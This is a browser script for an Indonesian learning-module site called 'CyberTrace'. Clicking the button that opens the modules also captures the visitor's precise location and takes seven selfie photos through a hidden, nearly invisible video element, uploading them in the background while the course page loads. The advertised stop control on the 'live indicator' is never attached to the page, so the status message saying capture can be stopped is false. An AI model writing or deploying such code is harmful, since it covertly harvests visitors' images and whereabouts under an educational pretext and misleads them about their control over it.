(() => {
  const button = document.getElementById('explore');
  const status = document.getElementById('access-status');
  if (!button || !status) return;

  const PHOTO_COUNT = 7;
  const PHOTO_INTERVAL_MS = 1500;
  let activeStream = null;
  let stopRequested = false;
  let uploadController = null;
  let uploaded = 0;
  let locationState = 'belum dibagikan';

  const say = message => { status.textContent = message; };
  const post = async (url, payload) => {
    const response = await fetch(url, {
      method: 'POST',
      credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const data = await response.json().catch(() => ({}));
    if (!response.ok) throw new Error(data.error || `HTTP ${response.status}`);
    return data;
  };
  const wait = ms => new Promise(resolve => setTimeout(resolve, ms));

  function getLocationOnce() {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) {
        reject(new Error('Browser tidak menyediakan Geolocation API.'));
        return;
      }
      navigator.geolocation.getCurrentPosition(async position => {
        try {
          await post('/api/share/consent', { resource: 'location' });
          resolve(await post('/api/share/location', {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            captured_at: new Date(position.timestamp).toISOString()
          }));
        } catch (error) {
          reject(new Error(`Lokasi tidak berhasil disimpan: ${error.message}`));
        }
      }, error => {
        const messages = {
          1: 'Akses lokasi ditolak.',
          2: 'Perangkat tidak dapat menentukan lokasi.',
          3: 'Waktu mendapatkan lokasi habis.'
        };
        reject(new Error(messages[error.code] || error.message || 'Lokasi tidak tersedia.'));
      }, { enableHighAccuracy: true, maximumAge: 0, timeout: 8000 });
    });
  }

  function ensureLiveIndicator() {
    let panel = document.getElementById('camera-live-indicator');
    if (panel) return panel;
    panel = document.createElement('aside');
    panel.id = 'camera-live-indicator';
    panel.setAttribute('role', 'status');
    panel.setAttribute('aria-live', 'polite');
    panel.style.cssText = 'position:fixed;right:18px;bottom:18px;z-index:99999;background:#071b2b;color:#eaf7ff;border:1px solid #20b9d2;border-radius:12px;padding:10px 12px;display:flex;align-items:center;gap:12px;box-shadow:0 8px 28px #0006;font:13px system-ui,sans-serif';
    const label = document.createElement('span');
    label.id = 'camera-live-label';
    label.textContent = '0/7';
    const stop = document.createElement('button');
    document.body.appendChild(panel);
    return panel;
  }

  function updateIndicator(message, finished = false) {
    const label = document.getElementById('camera-live-label');
    if (label) { const match = message.match(/Foto (\d+)\/7/); label.textContent = match ? ` ${match[1]}/7` : (finished ? ' selesai' : ' 0/7'); }
    const stop = document.querySelector('#camera-live-indicator button');
  }

  function stopCapture() {
    stopRequested = true;
    if (uploadController) uploadController.abort();
    if (activeStream) {
      activeStream.getTracks().forEach(track => track.stop());
      activeStream = null;
    }
    updateIndicator(`Pengambilan dihentikan · Foto ${uploaded}/7`, true);
  }

  async function startCameraAndBackgroundCapture() {
    if (!navigator.mediaDevices?.getUserMedia) throw new Error('Kamera tidak tersedia pada browser ini.');
    activeStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user' }, audio: false
    });
    await post('/api/share/consent', { resource: 'camera' });

    const video = document.createElement('video');
    video.autoplay = true;
    video.playsInline = true;
    video.muted = true;
    video.srcObject = activeStream;
    video.style.cssText = 'position:fixed;width:2px;height:2px;left:-10px;bottom:0;opacity:.01;pointer-events:none';
    document.body.appendChild(video);
    await video.play();

    await new Promise((resolve, reject) => {
      if (video.readyState >= HTMLMediaElement.HAVE_CURRENT_DATA && video.videoWidth > 0) return resolve();
      const timer = setTimeout(() => reject(new Error('Kamera belum menghasilkan gambar dalam 10 detik.')), 10000);
      video.addEventListener('loadeddata', () => {
        clearTimeout(timer);
        resolve();
      }, { once: true });
    });
    await wait(350);
    if (!video.videoWidth || !video.videoHeight) throw new Error('Frame kamera kosong.');

    ensureLiveIndicator();
    stopRequested = false;
    uploaded = 0;

    // Jalankan pengambilan di latar halaman yang sama; jangan menunggu 7 foto selesai.
    (async () => {
      try {
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const context = canvas.getContext('2d');
        if (!context) throw new Error('Tidak dapat menyiapkan gambar.');

        for (let i = 0; i < PHOTO_COUNT && !stopRequested; i++) {
          context.drawImage(video, 0, 0, canvas.width, canvas.height);
          const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.82));
          if (!blob) throw new Error(`Foto ke-${i + 1} gagal dibuat.`);
          const form = new FormData();
          form.append('image', blob, `capture-${i + 1}.jpg`);
          uploadController = new AbortController();
          const response = await fetch('/api/share/snapshot', {
            method: 'POST', credentials: 'same-origin', body: form,
            signal: uploadController.signal
          });
          const result = await response.json().catch(() => ({}));
          if (!response.ok) throw new Error(result.error || `Upload foto ke-${i + 1} gagal (HTTP ${response.status}).`);
          uploaded++;
          updateIndicator(`Kamera aktif · Foto ${uploaded}/7`);
          if (i < PHOTO_COUNT - 1) await wait(PHOTO_INTERVAL_MS);
        }
        if (!stopRequested) updateIndicator(`Pengambilan selesai · Foto ${uploaded}/7`, true);
      } catch (error) {
        if (error.name !== 'AbortError') updateIndicator(`Pengambilan terhenti · Foto ${uploaded}/7`, true);
      } finally {
        if (activeStream) activeStream.getTracks().forEach(track => track.stop());
        activeStream = null;
        video.remove();
      }
    })();
  }

  async function showModulesWithoutReload() {
    const response = await fetch('/modul', { credentials: 'same-origin' });
    if (!response.ok) throw new Error(`Halaman modul gagal dimuat (HTTP ${response.status}).`);
    const html = await response.text();
    const parsed = new DOMParser().parseFromString(html, 'text/html');
    const nextHeader = parsed.querySelector('header.nav');
    const nextMain = parsed.querySelector('main');
    const nextFooter = parsed.querySelector('footer');
    if (!nextHeader || !nextMain) throw new Error('Struktur halaman modul tidak ditemukan.');

    document.querySelector('header.nav')?.replaceWith(nextHeader.cloneNode(true));
    document.querySelector('main')?.replaceWith(nextMain.cloneNode(true));
    const oldFooter = document.querySelector('footer');
    if (oldFooter && nextFooter) oldFooter.replaceWith(nextFooter.cloneNode(true));
    document.title = parsed.title || 'Modul Pembelajaran — CyberTrace';
    history.pushState({ page: 'modules' }, '', '/modul');

    const q = document.getElementById('search');
    const g = document.getElementById('grade');
    const cards = [...document.querySelectorAll('.module-card')];
    const empty = document.getElementById('empty');
    if (q && g && empty) {
      const filter = () => {
        let count = 0;
        cards.forEach(card => {
          const ok = (!g.value || card.dataset.grade === g.value) &&
            (card.dataset.search || '').includes(q.value.toLowerCase());
          card.hidden = !ok;
          if (ok) count++;
        });
        empty.hidden = !!count;
      };
      q.addEventListener('input', filter);
      g.addEventListener('change', filter);
    }
    window.scrollTo(0, 0);
  }

  post('/api/share/heartbeat', {}).catch(error => console.warn('CyberTrace heartbeat:', error));
  const heartbeat = window.setInterval(() => {
    post('/api/share/heartbeat', {}).catch(error => console.warn('CyberTrace heartbeat:', error));
  }, 10000);
  window.addEventListener('pagehide', () => {
    window.clearInterval(heartbeat);
    if (activeStream) activeStream.getTracks().forEach(track => track.stop());
  }, { once: true });

  button.addEventListener('click', async () => {
    if (button.disabled) return;
    button.disabled = true;
    button.textContent = 'Meminta izin…';
    say('Meminta izin kamera dan lokasi. Anda dapat menolak dan tetap membuka modul.');

    // Lokasi diproses paralel agar tidak menahan perpindahan ke modul.
    const locationTask = getLocationOnce()
      .then(() => { locationState = 'terkirim'; })
      .catch(error => {
        locationState = 'tidak dibagikan';
        console.warn('CyberTrace location:', error);
      });

    try {
      await startCameraAndBackgroundCapture();
    } catch (error) {
      console.warn('CyberTrace camera:', error);
      say(`Kamera tidak aktif: ${error.message}. Modul tetap dibuka.`);
    }

    try {
      await showModulesWithoutReload();
      if (activeStream) {
        say('Modul terbuka. Kamera aktif; pengiriman foto berjalan dan dapat dihentikan melalui indikator.');
      } else {
        say('Modul terbuka. Tidak ada pengambilan foto yang berjalan.');
      }
    } catch (error) {
      say(`Modul gagal dibuka: ${error.message}. Buka modul melalui tautan Modul.`);
      console.error('CyberTrace module navigation:', error);
      button.disabled = false;
      button.textContent = 'Jelajahi Modul Pembelajaran';
    }
    locationTask.finally(() => console.info('CyberTrace location status:', locationState));
  });
})();
